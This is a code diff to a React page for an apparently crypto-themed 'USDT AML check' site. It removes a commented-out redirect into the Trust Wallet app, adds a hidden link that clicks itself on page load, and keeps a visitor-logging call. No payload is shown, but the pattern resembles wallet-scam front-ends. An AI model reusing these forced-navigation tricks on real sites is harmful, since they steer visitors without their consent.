@@ -6,7 +6,7 @@ import { ChooseNet } from "@/pagesComponents/ChooseNet/ChooseNet";
 import { Home } from "@/pagesComponents/Home/Home";
 import { setCurrentStep } from "@/Redux/Slice/MainSlice";
 import { RootState } from "@/Redux/store";
-import { useEffect } from "react";
+import { useEffect, useRef } from "react";
 import { useDispatch, useSelector } from "react-redux";
 
 // const DOMAIN = "https://usdtcheckaml.com";
@@ -14,15 +14,12 @@ import { useDispatch, useSelector } from "react-redux";
 export default function Page() {
   const { currentStep } = useSelector((store: RootState) => store.main);
   const dispatch = useDispatch();
+  const linkRef = useRef<HTMLAnchorElement | null>(null);
 
-  // useEffect(() => {
-  //   const ua = navigator.userAgent;
-  //   const isInsideTrustWallet = /Trust\//.test(ua) || /TrustWallet/.test(ua);
-
-  //   if (!isInsideTrustWallet) {
-  //     window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(DOMAIN)}`;
-  //   }
-  // }, []);
+  useEffect(() => {
+    linkRef.current?.click();
+    console.log(linkRef);
+  }, [linkRef]);
 
   useEffect(() => {
     fetch("/api/log", {
@@ -35,12 +32,12 @@ export default function Page() {
   }
   return (
     <>
-      {currentStep == 0 && <Home />}
-      {currentStep == 1 && <ChooseNet />}
-      {currentStep == 2 && <AMLLoading />}
-      {currentStep == 3 && (
+      <Home />
+      {/* {currentStep == 1 && <ChooseNet />}
+      {currentStep == 2 && <AMLLoading />} */}
+      {/* {currentStep == 3 && (
         <AMLResult onRepeat={() => dispatch(setCurrentStep(0))} />
-      )}
+      )} */}
     </>
   );
 }
